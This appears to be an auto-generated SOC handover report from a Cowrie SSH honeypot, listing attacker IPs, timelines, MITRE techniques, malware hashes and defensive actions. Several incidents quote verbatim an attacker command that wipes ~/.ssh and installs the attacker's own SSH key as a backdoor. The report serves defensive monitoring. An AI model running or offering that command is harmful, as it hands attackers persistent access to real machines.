| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 18:53:39` | `cowrie.session.connect` |
| `2026-06-04 18:53:39` | `cowrie.client.version` |
| `2026-06-04 18:53:39` | `cowrie.client.kex` |
| `2026-06-04 18:53:40` | `cowrie.login.success` |
| `2026-06-04 18:53:40` | `cowrie.session.params` |
| `2026-06-04 18:53:40` | `cowrie.command.input` |
| `2026-06-04 18:53:40` | `cowrie.command.failed` |
| `2026-06-04 18:53:40` | `cowrie.log.closed` |
| `2026-06-04 18:53:40` | `cowrie.session.params` |
| `2026-06-04 18:53:40` | `cowrie.command.input` |
| `2026-06-04 18:53:41` | `cowrie.session.file_download` |
| `2026-06-04 18:53:41` | `cowrie.log.closed` |
| `2026-06-04 18:53:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `58.229.253[.]119` to AbuseIPDB if not already reported
- [ ] Block `58.229.253[.]119` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-123ffdaf3e6c

| Field | Detail |
|---|---|
| **Source IP** | `58.229.253[.]119` |
| **First Seen** | 2026-06-04 18:53 |
| **Last Seen** | 2026-06-04 18:53 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 18:53:43` | `cowrie.session.connect` |
| `2026-06-04 18:53:43` | `cowrie.client.version` |
| `2026-06-04 18:53:43` | `cowrie.client.kex` |
| `2026-06-04 18:53:43` | `cowrie.login.success` |
| `2026-06-04 18:53:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `58.229.253[.]119` to AbuseIPDB if not already reported
- [ ] Block `58.229.253[.]119` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7bc4905024e1

| Field | Detail |
|---|---|
| **Source IP** | `14.103.127[.]232` |
| **First Seen** | 2026-06-04 18:58 |
| **Last Seen** | 2026-06-04 18:58 |
| **Session Duration** | 30s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 18:58:23` | `cowrie.session.connect` |
| `2026-06-04 18:58:23` | `cowrie.client.version` |
| `2026-06-04 18:58:23` | `cowrie.client.kex` |
| `2026-06-04 18:58:23` | `cowrie.login.success` |
| `2026-06-04 18:58:24` | `cowrie.session.params` |
| `2026-06-04 18:58:24` | `cowrie.command.input` |
| `2026-06-04 18:58:24` | `cowrie.command.failed` |
| `2026-06-04 18:58:24` | `cowrie.log.closed` |
| `2026-06-04 18:58:24` | `cowrie.session.params` |
| `2026-06-04 18:58:24` | `cowrie.command.input` |
| `2026-06-04 18:58:53` | `cowrie.session.file_download` |
| `2026-06-04 18:58:53` | `cowrie.log.closed` |
| `2026-06-04 18:58:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.127[.]232` to AbuseIPDB if not already reported
- [ ] Block `14.103.127[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3618b6a24ad4

| Field | Detail |
|---|---|
| **Source IP** | `103.134.154[.]138` |
| **First Seen** | 2026-06-04 18:58 |
| **Last Seen** | 2026-06-04 18:58 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 18:58:37` | `cowrie.session.connect` |
| `2026-06-04 18:58:37` | `cowrie.client.version` |
| `2026-06-04 18:58:37` | `cowrie.client.kex` |
| `2026-06-04 18:58:37` | `cowrie.login.success` |
| `2026-06-04 18:58:38` | `cowrie.session.params` |
| `2026-06-04 18:58:38` | `cowrie.command.input` |
| `2026-06-04 18:58:38` | `cowrie.command.failed` |
| `2026-06-04 18:58:38` | `cowrie.log.closed` |
| `2026-06-04 18:58:38` | `cowrie.session.params` |
| `2026-06-04 18:58:38` | `cowrie.command.input` |
| `2026-06-04 18:58:38` | `cowrie.session.file_download` |
| `2026-06-04 18:58:38` | `cowrie.log.closed` |
| `2026-06-04 18:58:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.134.154[.]138` to AbuseIPDB if not already reported
- [ ] Block `103.134.154[.]138` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cd05f23d82b1

| Field | Detail |
|---|---|
| **Source IP** | `103.134.154[.]138` |
| **First Seen** | 2026-06-04 18:58 |
| **Last Seen** | 2026-06-04 18:58 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 18:58:39` | `cowrie.session.connect` |
| `2026-06-04 18:58:39` | `cowrie.client.version` |
| `2026-06-04 18:58:39` | `cowrie.client.kex` |
| `2026-06-04 18:58:40` | `cowrie.login.success` |
| `2026-06-04 18:58:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.134.154[.]138` to AbuseIPDB if not already reported
- [ ] Block `103.134.154[.]138` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2634813f18f7

| Field | Detail |
|---|---|
| **Source IP** | `192.42.116[.]144` |
| **First Seen** | 2026-06-04 19:34 |
| **Last Seen** | 2026-06-04 19:34 |
| **Session Duration** | 22s |
| **Login Attempts** | 2 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1110.001 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 19:34:30` | `cowrie.session.connect` |
| `2026-06-04 19:34:30` | `cowrie.client.version` |
| `2026-06-04 19:34:30` | `cowrie.client.kex` |
| `2026-06-04 19:34:32` | `cowrie.client.fingerprint` |
| `2026-06-04 19:34:32` | `cowrie.login.failed` |
| `2026-06-04 19:34:32` | `cowrie.login.success` |
| `2026-06-04 19:34:52` | `cowrie.direct-tcpip.request` |
| `2026-06-04 19:34:52` | `cowrie.direct-tcpip.ja4` |
| `2026-06-04 19:34:52` | `cowrie.direct-tcpip.data` |
| `2026-06-04 19:34:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `192.42.116[.]144` to AbuseIPDB if not already reported
- [ ] Block `192.42.116[.]144` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `45.66.156[.]214` | **33** | 2026-06-04 17:01 | 2026-06-04 20:09 | 22m | 0 | `T1592` | 🟠 MEDIUM |
| `14.29.240[.]154` | **31** | 2026-06-04 18:14 | 2026-06-04 18:30 | 54m | 4 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `156.239.224[.]79` | **30** | 2026-06-04 17:05 | 2026-06-04 18:15 | 0m | 30 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `14.103.127[.]232` | **27** | 2026-06-04 18:10 | 2026-06-04 19:00 | 44m | 5 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `103.67.80[.]61` | **17** | 2026-06-04 16:57 | 2026-06-04 17:31 | 0m | 17 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `103.134.154[.]138` | **16** | 2026-06-04 18:16 | 2026-06-04 19:07 | 0m | 16 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `139.198.113[.]29` | **16** | 2026-06-04 16:57 | 2026-06-04 17:28 | 0m | 16 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `58.229.253[.]119` | **16** | 2026-06-04 18:16 | 2026-06-04 18:53 | 0m | 16 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `41.57.16[.]3` | **10** | 2026-06-04 17:02 | 2026-06-04 17:08 | 18m | 0 | `T1592` | 🟠 MEDIUM |
| `66.132.172[.]188` | **4** | 2026-06-04 18:34 | 2026-06-04 18:35 | 0m | 0 | `T1592` | 🟢 LOW |
| `14.103.127[.]233` | **3** | 2026-06-04 19:59 | 2026-06-04 20:09 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `66.132.172[.]196` | **3** | 2026-06-04 18:35 | 2026-06-04 18:37 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]78` | **3** | 2026-06-04 18:33 | 2026-06-04 18:34 | 0m | 0 | `T1592` | 🟢 LOW |
| `20.81.140[.]174` | **2** | 2026-06-04 18:40 | 2026-06-04 19:10 | 0m | 0 | `T1592` | 🟢 LOW |
| `101.42.25[.]74` | 1 | 2026-06-04 17:04 | 2026-06-04 17:05 | 52s | 0 | `T1592` | 🟢 LOW |
| `111.21.215[.]254` | 1 | 2026-06-04 17:57 | 2026-06-04 17:58 | 13s | 0 | `T1592` | 🟢 LOW |
| `14.103.112[.]14` | 1 | 2026-06-04 18:35 | 2026-06-04 18:37 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.118[.]212` | 1 | 2026-06-04 18:36 | 2026-06-04 18:37 | 93s | 0 | `T1592` | 🟢 LOW |
| `152.53.22[.]186` | 1 | 2026-06-04 18:13 | 2026-06-04 18:13 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `157.0.0[.]10` | 1 | 2026-06-04 17:00 | 2026-06-04 17:00 | 30s | 0 | `T1592` | 🟢 LOW |
| `183.220.38[.]154` | 1 | 2026-06-04 19:21 | 2026-06-04 19:23 | 120s | 0 | `T1592` | 🟢 LOW |
| `187.140.5[.]12` | 1 | 2026-06-04 18:30 | 2026-06-04 18:30 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `196.204.71[.]189` | 1 | 2026-06-04 19:38 | 2026-06-04 19:38 | 0s | 0 | `T1592` | 🟢 LOW |
| `219.150.93[.]157` | 1 | 2026-06-04 18:28 | 2026-06-04 18:30 | 120s | 0 | `T1592` | 🟢 LOW |
| `43.156.60[.]15` | 1 | 2026-06-04 18:16 | 2026-06-04 18:16 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `43.224.126[.]107` | 1 | 2026-06-04 17:09 | 2026-06-04 17:11 | 120s | 0 | `T1592` | 🟢 LOW |
| `45.156.129[.]80` | 1 | 2026-06-04 17:44 | 2026-06-04 17:44 | 8s | 0 | `T1592` | 🟢 LOW |
| `52.186.174[.]247` | 1 | 2026-06-04 20:09 | 2026-06-04 20:09 | 0s | 0 | `T1592` | 🟢 LOW |
| `72.47.208[.]106` | 1 | 2026-06-04 17:07 | 2026-06-04 17:07 | 30s | 0 | `T1592` | 🟢 LOW |
| `83.118.87[.]189` | 1 | 2026-06-04 18:03 | 2026-06-04 18:03 | 12s | 0 | `T1592` | 🟢 LOW |
| `93.123.109[.]222` | 1 | 2026-06-04 18:42 | 2026-06-04 18:42 | 0s | 3 | `T1110.001` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (32 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0d3d2e513043f33923c8538f0d40b246730eb64d685628c28b89b04b6efcabf3` | ELF Binary (Linux executable) (x86-64 64-bit) | `0d3d2e513043f339...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `235596e7fb00cc04e95c500b5d02891e4b5d5ee54d063553a62c93b6bbd3eb9a` | ELF Binary (Linux executable) (ARM 32-bit) | `235596e7fb00cc04...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `2495e33392ef58d29cef5077b77c6c9164ad3f4cfb2c433b344df7e674542664` | Unknown binary | `2495e33392ef58d2...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `321bfd80417496f99f32183c73d0a46b42900a8ae9d87b4079740b9297bc3cb4` | ELF Binary (Linux executable) (ARM 32-bit) | `321bfd80417496f9...` | 42/100 | 🟡 MEDIUM | **31/75** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e` | Unknown binary | `6b3a55e0261b0304...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `99ac78541bb555b05a2c82d6c191d62e639b9fefd26ddee1f813b79cc6baf4f0` | ELF Binary (Linux executable) (MIPS 32-bit) | `99ac78541bb555b0...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 13/100 | 🟢 LOW | **33/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `72.47.208[.]106` | US | GoDaddy.com, LLC | **100** ⚠️ | 7 |
| `43.156.60[.]15` | SG | Asia Pacific Network Information Center, Pty. Ltd. | **100** ⚠️ | 6 |
| `52.186.174[.]247` | US | Microsoft Corporation | **100** ⚠️ | 0 |
| `14.103.112[.]14` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 50 |
| `101.42.25[.]74` | CN | Tencent Cloud Computing (Beijing) Co., Ltd | **100** ⚠️ | 1 |
| `196.204.71[.]189` | EG | Local ISP | **100** ⚠️ | 50 |
| `45.66.156[.]214` | US | Enzu cloud and colocation services | **100** ⚠️ | 1 |
| `14.103.127[.]232` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 50 |
| `14.29.240[.]154` | CN | CHINANET Guangdong province network | **100** ⚠️ | 50 |
| `219.150.93[.]157` | CN | XINXIBAN-LTD. | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 230 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 110 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 65 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 33 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 33 |

---

## 🔕 False Positive Summary (16 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 2 |
| AbuseIPDB score 22 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 13 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 309 cases |
| Tool 34  | Credential Extractor        | ✅ 177 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 7 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 37 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 16 filtered (5.2%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 28 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 32 files |
| Tool 33  | YARA Classifier             | ✅ 10 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 65 priority case(s) shown individually · 31 recon entry/entries in table (14 group(s) consolidating 211 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-06-04T20:10:43Z_
